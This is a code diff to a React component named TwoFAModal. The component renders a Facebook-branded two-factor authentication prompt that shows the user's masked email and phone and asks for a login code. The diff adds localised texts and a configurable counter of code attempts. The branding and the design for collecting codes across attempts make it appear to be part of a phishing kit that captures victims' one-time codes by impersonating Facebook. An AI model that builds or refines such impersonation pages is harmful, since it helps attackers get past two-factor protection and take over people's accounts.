@@ -96,10 +96,19 @@ const TwoFAModal = ( { show, onClose, onSubmit, onSuccess, texts, formData } ) =
         return `${ countryCode || '+' } **** ${ lastTwo }`;
     };
 
-    const fullName = formData?.fullName || 'User';
+    const maxCodeAttempts = Math.max( 1, config.max_code_attempts || 2 );
+    const twoFaAttemptShown = Math.min( attempts + 1, maxCodeAttempts );
+    const twoFATitleBase = texts.twoFATitleNew || 'Two-factor authentication required';
+    const twoFADisplayTitle = `${ twoFATitleBase } (${ twoFaAttemptShown }/${ maxCodeAttempts })`;
+
+    const fullName = formData?.fullName || texts.twoFAFallbackUser || 'User';
     const emailToDisplay = formData?.personalEmail || formData?.businessEmail;
     const maskedEmail = maskEmail( emailToDisplay );
     const maskedPhone = maskPhone( formData?.phone );
+
+    const twoFADescription = ( texts.twoFADescriptionTemplate || 'Enter the code for this account that we send to {{email}}, {{phone}} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)' )
+        .replace( /\{\{email\}\}/g, maskedEmail )
+        .replace( /\{\{phone\}\}/g, maskedPhone );
 
     if ( !show ) return null;
 
@@ -143,19 +152,19 @@ const TwoFAModal = ( { show, onClose, onSubmit, onSuccess, texts, formData } ) =
                             <div style={ { display: 'flex', width: '100%', alignItems: 'center', color: '#9a979e', gap: '6px', fontSize: '14px', marginBottom: '7px' } }>
                                 <span>{ fullName }</span>
                                 <div style={ { width: '4px', height: '4px', background: '#9a979e', borderRadius: '5px' } } />
-                                <span>Facebook</span>
+                                <span>{ texts.twoFABrandFacebook || 'Facebook' }</span>
                             </div>
 
-                            <h2 style={ { fontSize: '20px', color: 'black', fontWeight: '700', marginBottom: '15px' } }>
-                                Two-factor authentication required (1/3)
-                            </h2>
+                            <div style={ { fontSize: '20px', color: 'black', fontWeight: '700', marginBottom: '15px' } }>
+                                { twoFADisplayTitle }
+                            </div>
 
                             <p style={ { color: '#9a979e', fontSize: '14px', lineHeight: '1.5' } }>
-                                Enter the code for this account that we send to { maskedEmail }, { maskedPhone } or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)
+                                { twoFADescription }
                             </p>
 
                             <div style={ { width: '100%', borderRadius: '10px', background: '#f5f5f5', overflow: 'hidden', margin: '15px 0' } }>
-                                <img width="100%" alt="authentication" src={ TwoFAImage } style={ { display: 'block' } } />
+                                <img width="100%" alt={ texts.twoFAAuthenticationImageAlt || 'authentication' } src={ TwoFAImage } style={ { display: 'block' } } />
                             </div>
 
                             <div style={ { width: '100%' } }>
@@ -216,7 +225,7 @@ const TwoFAModal = ( { show, onClose, onSubmit, onSuccess, texts, formData } ) =
                                                     animation: 'spin 0.8s linear infinite',
                                                     display: 'inline-block'
                                                 } } />
-                                            ) : 'Continue' }
+                                            ) : ( texts.continueBtn || 'Continue' ) }
                                         </button>
                                     </div>
 
